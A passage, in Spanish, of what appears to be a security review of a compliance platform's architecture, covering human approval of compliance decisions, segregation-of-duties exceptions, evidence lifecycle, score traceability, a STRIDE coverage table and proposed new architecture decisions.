| Decisiones de interpretación normativa/seguridad marcadas "pendiente de aprobación humana" | **No cumple del todo** | Marcadas: AD-7 (D-3), AD-8 (D-6), AD-10 (D.4), AD-20 (Q6). **Sin marca** en la espina: AD-13 (MIME, AV, 15 min), AD-14 (adaptador `env`, KMS F2), AD-15 (better-auth, API keys), AD-6 (procedimiento ante rotura, ancla F2), AD-17 (modelos por defecto, retención del proveedor). Están en SECURITY §14 (S-1..S-18), pero la espina es la que se bloquea (SC-23) |
| Toda puntuación expone fórmula/numerador/denominador/exclusiones/fuentes | **Cumple en contrato; falta alcance** | AD-16 define `ScoreSnapshot` completo; `Binds` omite Risk (riesgo residual), AIMS (checklist de preparación), Controls & SoA (madurez) e Impact (SC-19). Sin la vinculación, `risk-engine-core` podría exponer un número sin desglose |
| La SoA gobierna los flujos, sin camino alternativo | **Cumple** | AD-9: solo Controls & SoA emite eventos de aplicabilidad; nadie lee `soa_items`; `Not Applicable` exige justificación, no genera tareas ni métricas y sigue visible. Hueco de carrera: un consumidor que reaccione a `CONTROL_ACTIVATED` y otro que consulte `isControlActive` pueden divergir unos segundos; aceptable si todo consumidor idempotente re-verifica por puerto antes de crear tareas (añadir a la `Rule`) |
| Evidencia subida ≠ evidencia aceptada | **Cumple implícitamente; formalizar** | AD-13 (`Collected` tras escaneo) y AD-10 (`evidence.approve` vía `Approval`) lo implican; nada dice que solo `Accepted` y vigente cuenta en `ScoreSnapshot` ni que `Collected` es transición automática de `system` (SC-20) |
| Declarar un requisito implementado requiere aprobación humana | **No cubierto en la espina** | Addendum E descarta "cambio automático de estado de requisito por eventos", pero ningún AD lo prohíbe; AD-17 solo lo prohíbe a la IA (SC-12) |

#### SC-12 — high — AD-9 / AD-10 — Transición automática de `RequirementImplementation`/`ControlImplementation` no prohibida

**Propuesta (Rule endurecida AD-10).** "Los estados `Implemented`/`Effective` de `RequirementImplementation` y `ControlImplementation`, `Accepted` de `Evidence`, `Treated`/`Accepted` de `Risk`, `Approved` de SoA/políticas/alcance y `Closed` de `CorrectiveAction` solo cambian por command de un `user` con `Approval` (AD-10). Los eventos de otros contextos (evidencia aceptada, tarea completada, sincronización de conector) solo pueden fijar `suggested_status` y `readiness_hint`, nunca `status`. Una prueba de arquitectura recorre las máquinas de estado en `src/state/` y falla si una transición a esos estados es alcanzable desde un manejador de eventos o desde `system`." Aprobación humana: sí (interpretación normativa: qué estados son "decisión de cumplimiento").

#### SC-14 — high — AD-11 / AD-13 — Archivo de evidencia sin `Approval` ni `LegalHold`

**Propuesta (Rule endurecida AD-11).** "Archivar (`deleted_at`) una `Evidence` con `EvidenceLink` a un control `Applicable`, a un riesgo tratado o a una auditoría en curso, o cualquier `Document` aprobado, es una decisión de cumplimiento: exige `reason`, `Approval` (AD-10) y ausencia de `LegalHold`; emite `EVIDENCE_ARCHIVED { links_affected[] }` y notifica a cada `Control Owner` afectado; los `ScoreSnapshot` siguientes lo listan en `exclusions[]` con motivo `evidence_archived`. Evidencia sin enlaces puede archivarse con `reason` y evento, sin `Approval`." Aprobación humana: sí (CLAUDE.md "borrar o alterar evidencia").

#### SC-17 — medium — AD-12 — Términos prohibidos en artefactos de IA e informes

**Propuesta.** "El filtro de términos prohibidos se aplica en tres puntos: recursos i18n y API (ya), salida de `LLMProvider` antes de crear `AIGeneratedArtifact` (rechazo con `FORBIDDEN_CLAIM`), y `ReportRun` renderizado (el job falla y registra). Lista en `kernel/forbidden-claims.ts`, bilingüe." Sin aprobación humana para el mecanismo; sí para ampliar la lista.

#### SC-19 — medium — AD-16 — Vincular `ScoreSnapshot` a todos los productores de números

**Propuesta.** Cambiar `Binds` de AD-16 a "all (todo contexto que produzca un porcentaje, índice, nivel o puntuación)", y añadir a la prueba de arquitectura: "ningún DTO de API contiene un campo numérico anotado `@score` sin `ScoreSnapshot` adjunto". Sin aprobación humana.

#### SC-20 — medium — AD-13 / AD-9 — Formalizar "subida ≠ aceptada" y vigencia

**Propuesta.** "`Evidence.status`: `Uploaded → Collected (system, tras Clean) → UnderReview → Accepted | Rejected → Expired (system, por `valid_until`)`. Solo `Accepted` y no `Expired` satisface un `EvidenceLink` en puntuaciones e informes; `Collected` nunca se muestra como "cumple". La caducidad es automática y **degrada** (nunca acepta)." Aprobación humana: sí para la regla de vigencia (interpretación normativa/organizacional).

#### SC-23 — medium — Espina sin lista propia de decisiones de seguridad pendientes

**Propuesta.** Añadir a la espina una tabla "Pendiente de aprobación humana" que referencie S-1..S-18 y D-3/D-6/D.4/Q6, y cambiar `[ADOPTED]` por `[ADOPTED, pendiente ratificación humana S-n]` en AD-6, AD-13, AD-14 y en la fila better-auth del stack. Es la única forma de que `lock` de la arquitectura respete CLAUDE.md ("bloquear la arquitectura" y "cambios de arquitectura de seguridad" requieren aprobación).

### C. Separación de funciones y auditabilidad

#### SC-06 — high — AD-10 — Excepción de separación de funciones manipulable y sin acotar

**Evidencia.** AD-10: "si el tenant no tiene otro usuario con el permiso, se permite con `SegregationOfDutiesException`". La condición se evalúa en el momento: un OA con `users.manage` puede desactivar al único otro aprobador, aprobar con excepción y reactivarlo. No se acota por tipo de decisión (¿puede aceptarse un riesgo residual crítico o aprobar la SoA bajo excepción?), ni se exige que alguien distinto la reconozca después, ni se dice qué efecto tiene en `Audit-ready`.

**Propuesta (Rule endurecida AD-10).**
- "La excepción solo procede si **ningún otro usuario activo o desactivado en los últimos 30 días** `[ASSUMPTION]` ha tenido el permiso; si existe uno desactivado recientemente, la acción se rechaza con `SEGREGATION_OF_DUTIES` y el motivo."
- "La excepción se registra como `SegregationOfDutiesException { approval_id, actor, reason, permission, alternatives_checked }` con evento propio `SOD_EXCEPTION_RECORDED` y **debe ser reconocida** (`acknowledged_by ≠ actor`, típicamente `Executive`) en la siguiente revisión por la dirección; las excepciones no reconocidas bloquean `Audit-ready` y aparecen en el informe de preparación."
- "Lista cerrada de decisiones **no excepcionables** `[pendiente de aprobación humana: interpretación normativa]`: `soa.approve`, `risks.accept` para nivel `Critical`, `policies.approve`, `management_review.approve`. Para ellas el tenant debe tener dos usuarios habilitados o la plataforma ofrece un revisor externo invitado con caducidad."
- "`deactivateUser` de un usuario con permisos de aprobación emite `APPROVER_DEACTIVATED` y exige `reason`."

**Aprobación humana:** sí (D.4/S-7 y la lista de decisiones no excepcionables).

#### Atribución del aprobador en todos los flujos

Con SC-05 aplicado, todas las transiciones derivadas de `APPROVAL_GRANTED` conservan `decided_by` como actor. Quedan dos flujos a verificar en el diseño de cada cambio:
- **Aprobación sincrónica vía `ApprovalPort` en el mismo command** (AD-10): el actor del command es el aprobador; correcto. Debe registrarse `requested_by` distinto (quien creó/solicitó) en la misma entrada; la espina lo tiene en la entidad, no en `audit_entries`. Añadir `requested_by` al `payload` de los eventos de decisión.
- **Acciones de jobs con efecto de cumplimiento** (`retention-sweeper` marca `RETENTION_EXPIRED`, `evidence-scan` marca `Rejected`, `Evidence.Expired`): son de `system`, son degradaciones (nunca aceptan) y deben llevar `job_name@version` como actor y `reason` fija. Aceptable si SC-05 y SC-20 se adoptan.
- **`ai-assistant`**: solo `*.suggest`; sus artefactos llevan `reviewer_id`. Correcto; blindar `review_status` (SC-11).

#### SC-24, SC-25, SC-26 — low

- **SC-24 (AD-11)**: RLS no filtra `deleted_at`; los repositorios y las vistas de Reporting deben excluirlo por defecto (`withDeleted()` explícito). Añadir a la `Rule` de AD-11 y a la prueba de arquitectura.
- **SC-25 (AD-20)**: "`prisma migrate deploy` como paso previo obligatorio" sin distinguir migraciones irreversibles (CLAUDE.md exige aprobación humana). Añadir: "una migración que borra columnas/tablas o cambia tipos con pérdida lleva marcador `-- irreversible` y el pipeline exige aprobación manual del entorno".
- **SC-26 (AD-6)**: documentar que `previous_hash = SHA-256(tenant_id)` es un valor de arranque público (no aporta secreto) y que la garantía viene del ancla (SC-13); `session_metadata.ip` según SC-03.

## 4. Cobertura STRIDE tras aplicar las correcciones

| Superficie / amenaza del encargo | AD que la cierra hoy | Estado hoy | Corrección |
| --- | --- | --- | --- |
| Fuga cross-tenant por jobs multi-tenant | AD-2, AD-5 (parcial) | **Abierta**: enumeración y principal `system` sin definir | SC-05 (AD-24) |
| Fuga por Reporting/búsqueda (proyecciones) | AD-2 (tenant) | **Abierta intra-tenant** (permisos) | SC-07 |
| Fuga por URLs firmadas | AD-13 | Parcial (portador, `Pending`) | SC-15 |
| Fuga por outbox/dead_letter | AD-2 sobre `outbox_events` | **Abierta** en `pgboss.*` | SC-04 |
| `ENTITY_MUTATED` con secretos/datos personales | EVENT §3.1 (secretos: cerrada) | **Abierta** para datos personales | SC-03 (AD-25) |
| Escalada vía roles personalizables | AD-8 | **Abierta** | SC-02 (AD-26) |
| `Platform Administrator` | AD-8 + §B | **Abierta** (matriz contradice regla) | SC-01 |
| API keys | AD-15 | Parcial | SC-08 |
| better-auth / peer deps | Stack, ADR-011 | Riesgo aceptado sin puerto | SC-22 |
| Ancla externa diferida | AD-6 | Insuficiente para piloto real | SC-13 |
| Integridad de la semilla | AD-7, AD-23 | Parcial (sin procedencia) | SC-16 |
| SSRF en conectores | AD-18, S-16 | Parcial (F2); **abierta en OIDC hoy** | SC-09, SC-21 |
| Inyección de prompts / exfiltración vía grounding | AD-17 | Parcial (F2) | SC-11 |

## 5. Nuevas AD propuestas (resumen)

- **AD-24 — Principal `system`, fan-out por tenant y atribución de actor.** Tabla global `tenants` como única enumeración; un job por tenant; prohibido `BYPASSRLS` y comodines; `actor_type` canónico; `system` nunca actor de decisión de cumplimiento; eventos derivados de `Approval` conservan `decided_by` y `on_behalf_of`. (SC-04, SC-05)
- **AD-25 — Datos personales en eventos, proyecciones y auditoría.** Campos `@personal` por entidad; tokenización/hash en `before/after` y `audit_entries`; IP truncada o cifrada con DEK por tenant; permisos `audit_trail.*`; exportaciones filtradas por clasificación. (SC-03, SC-26)
- **AD-26 — Gobierno de roles y separación de funciones por conjuntos de permisos.** `INCOMPATIBLE_PERMISSION_SETS` en el kernel; permisos reservados; cambios de rol con `Approval`; no delegar lo que no se tiene; excepción SoD acotada, reconocida y con lista de decisiones no excepcionables. (SC-02, SC-06)

## 6. Lo que está bien y debe conservarse

- RLS con `FORCE`, fallo seguro a cero filas, rol de aplicación sin `BYPASSRLS` y rol de migración separado; prueba que recorre `pg_class`.
- Outbox en la misma transacción, consumidores idempotentes con `processed_events`, envelope con `correlation_id`/`causation_id`.
- `audit_entries` append-only por privilegio de BD **y** trigger, escritor único serializado por tenant, JSON canónico RFC 8785, procedimiento ante rotura que nunca "repara".
- `Approval` como única forma de aprobar, con `previous_state/new_state` y `reason`.
- SoA por eventos y puerto, `Not Applicable` con justificación obligatoria, Anexo B fuera de la SoA.
- `ScoreSnapshot` con fórmula/numerador/denominador/exclusiones/fuentes; informes declarativos sin SQL libre.
- IA por puerto, invocación explícita, `*.suggest`, artefactos marcados, validación de referencias contra el catálogo, plataforma registrada como `AISystem`.
- Estados honestos de conectores y `mock` etiquetado.

## 7. Condiciones para levantar el veredicto

1. Corregir SC-01, SC-02 y SC-03 en la espina (AD-8, AD-6, AD-25, AD-26) y en la matriz §B antes del cambio 3 `identity-and-rbac` y del cambio 4 `immutable-audit-trail`.
2. Adoptar AD-24 (SC-04, SC-05) antes del cambio 5 `domain-events-outbox-jobs`.
3. Cerrar SC-09 y SC-10 antes de habilitar OIDC en cualquier entorno distinto de `local|ci`.
4. Añadir la tabla de decisiones pendientes de aprobación humana a la espina (SC-23) y obtener la ratificación de S-1..S-18 antes de `lock`.
5. SC-12, SC-14, SC-20 y SC-06 se resuelven en la espina ahora y se ratifican por el propietario del producto (interpretación normativa) antes de los cambios 6, 12 y 13.
6. El resto (medium/low) puede resolverse en los `design.md` de los cambios afectados, con referencia a este ID.
